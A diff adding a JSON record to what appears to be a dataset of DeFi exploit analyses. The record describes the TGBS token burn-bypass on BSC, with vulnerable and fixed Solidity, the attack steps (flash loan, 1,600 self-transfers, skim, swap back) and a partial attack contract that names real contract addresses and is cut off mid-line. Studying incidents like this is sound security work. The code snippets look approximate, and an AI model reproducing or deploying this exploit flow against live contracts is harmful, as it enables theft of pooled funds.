@@ -1,0 +1,35 @@
+{
+ "id": "2024__2024-03-XX_TGBS_BurnBlockBypass",
+ "source_file": "2024/2024-03-XX_TGBS_BurnBlockBypass.md",
+ "title": "TGBS — _burnBlock Burn Mechanism Bypass Analysis",
+ "date": "2024-03-01",
+ "protocol": "TGBS",
+ "chain": "BSC",
+ "loss_raw": "~$150,000",
+ "loss_usd": 150000.0,
+ "root_cause": "The `_burnBlock()` function returns a block number used to determine whether token burning occurs; by performing 1,600+ self-transfers, the attacker bypasses the block number condition and accumulates large amounts of tokens without any burn",
+ "attack_tx": null,
+ "vulnerable_contract": "TGBS 0xedecfA18",
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: _burnBlock condition can be bypassed via self-transfer\nfunction _burnBlock() internal view returns (uint256) {\n    // Returns a specific block number — a manipulable condition\n    return startBlock + (block.number - startBlock) / BURN_INTERVAL * BURN_INTERVAL;\n}\n\nfunction _transfer(address from, address to, uint256 amount) internal override {\n    // Burn is only executed when block.number == _burnBlock()\n    if (block.number == _burnBlock()) {\n        uint256 burnAmount = amount * burnRate / 10000;\n        _burn(from, burnAmount);\n        amount -= burnAmount;\n    }\n    // The same logic applies during self-transfer (from == to)\n    // 1,600 self-transfers can push past the _burnBlock condition block\n    super._transfer(from, to, amount);\n}\n\n//",
+  "// File: TGBS_decompiled.sol\ncontract TGBS {\n    function _burnBlock() external {}  // ❌ Vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: self-transfer blocked + improved block-based burn\nfunction _transfer(address from, address to, uint256 amount) internal override {\n    require(from != to, \"self transfer not allowed\");\n    if (shouldBurn(block.number)) {\n        uint256 burnAmount = amount * burnRate / 10000;\n        _burn(from, burnAmount);\n        amount -= burnAmount;\n    }\n    super._transfer(from, to, amount);\n}"
+ ],
+ "steps": [
+  "→ [1] DPP Flash Loan: borrow large amount of WBNB",
+  "→ [2] Swap WBNB → TGBS",
+  "→ [3] Repeat self-transfer 1,600 times",
+  "→ [4] Extract accumulated TGBS via skim()",
+  "→ [5] Swap TGBS → WBNB",
+  "→ [6] Repay flash loan + ~$150K profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] DPP Flash Loan: borrow large amount of WBNB\n  │\n  ├─→ [2] Swap WBNB → TGBS\n  │\n  ├─→ [3] Repeat self-transfer 1,600 times\n  │         └─ Advances past _burnBlock() condition block, bypassing burn\n  │\n  ├─→ [4] Extract accumulated TGBS via skim()\n  │\n  ├─→ [5] Swap TGBS → WBNB\n  │\n  └─→ [6] Repay flash loan + ~$150K profit",
+  "interface ITGBS {\n    function transfer(address to, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n}\n\ninterface IDVM {\n    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;\n}\n\ncontract AttackContract {\n    ITGBS  constant TGBS    = ITGBS(0xedecfA18CAE067b2489A2287784a543069f950F4);\n    IDVM   constant dpp     = IDVM(0x05d968B7101701b6AD5a69D45323746E9a791eB5);\n    IERC20 constant WBNB    = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n\n    function testExploit() external {\n        dpp.flashLoan(wbnbAmount, 0, address(this), \"\");\n    }\n\n    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {\n        // [1] Swap WBNB → TGBS\n        swa"
+ ]
+}
